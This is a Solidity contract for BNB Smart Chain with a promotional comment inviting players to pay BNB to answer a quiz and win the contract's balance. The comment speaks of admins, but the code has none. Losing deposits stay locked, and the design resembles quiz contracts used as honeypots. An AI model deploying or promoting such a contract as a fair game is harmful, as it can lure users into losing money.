// SPDX-License-Identifier: MIT
//
//    ___                                _       _ 
//   |_  |                              | |     | |
//     | | ___  ___  _ __   __ _ _ __ __| |_   _| |
//     | |/ _ \/ _ \| '_ \ / _` | '__/ _` | | | | |
// /\__/ /  __/ (_) | |_) | (_| | | | (_| | |_| |_|
// \____/ \___|\___/| .__/ \__,_|_|  \__,_|\__, (_)
//                  | |                     __/ |  
//                  |_|                    |___/   
//
//
/*
 *
 * Welcome to Jeopardy!, the BSC-based puzzle game where wit meets reward.
 * Our diligent admins post a fresh, challenging question, and here's where you step in.
 * Think, ponder and when ready, submit your answer along with a certain amount of BNB.
 * If your answer hits the bull's eye, the entire BNB balance of the contract is yours!
 * So, are you ready to join this exciting journey of mind-boggling riddles and bountiful
 * rewards?
 *
 * How to Participate:
 * Step 1: Connect Your wallet.
 * Step 2: View the question asked. This can be done by interacting with the contract on BSC Scan.
 * Step 3: Submit Your answer by calling the `Answer` function.
 * Step 4: If your response is correct, and you've sent at least 10% of the previous contract's value.
           the contract automatically transfers its entire BNB balance to your wallet.
 *         If not, the BNB you've sent will be added to the balance of the contract.
 *
 * Here's how to do it using BSC Scan:
 *  1. Navigate to the contract's page on BSC Scan.
 *  2. Under the `Contract` tab, click on `Read Contract`.
 *  3. Locate the `question` field and click on it to reveal the current question.
 *  4. Under the `Contract` tab, click on `Write Contract`.
 *  5. Connect your BSC wallet by clicking on `Connect to Web3`.
 *  6. Find the `Answer` function in the list and enter your response into the `_yourAnswer` field.
 *     Enter the amount of at least 10% of the current contract balance in the `Value` field.
 *  7. Click on `Write` to submit your answer. Confirm the transaction in your wallet.
 *
 * Please remember that all transactions on the blockchain are final and cannot be reversed,
 * so always double-check your transactions before confirming them. Be careful and enjoy the game!
 *
 */

pragma solidity ^0.8;

contract JeopardyGame {
    string public question;
    bytes32 private validAnswerHash;

    function Ask(string calldata _question, string calldata _validAnswer) public payable {
        require(validAnswerHash == 0);
        question = _question;
        validAnswerHash = keccak256(abi.encode(_validAnswer));
    }

    function Answer(string memory _yourAnswer) public payable {
        uint256 balance = address(this).balance;
        if (msg.value >= balance/11 &&
                msg.sender == tx.origin &&            
                keccak256(abi.encode(_yourAnswer)) == validAnswerHash){
            payable(msg.sender).transfer(balance);
        }
    }
}